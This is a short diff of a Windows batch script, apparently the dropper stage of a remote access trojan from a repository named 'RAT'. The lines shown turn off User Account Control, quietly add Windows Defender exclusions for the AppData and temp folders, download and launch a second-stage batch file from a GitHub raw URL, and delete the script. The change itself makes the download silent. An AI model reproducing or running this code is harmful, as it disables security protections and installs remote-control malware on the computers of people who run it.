@@ -26,6 +26,6 @@ if '%errorlevel%' NEQ '0' (
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath C:/Users/%username%/AppData/Roaming/Microsoft/Windows/
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
-start /B curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
+curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat --silent
 start "" secondary.bat
 del "%~f0"
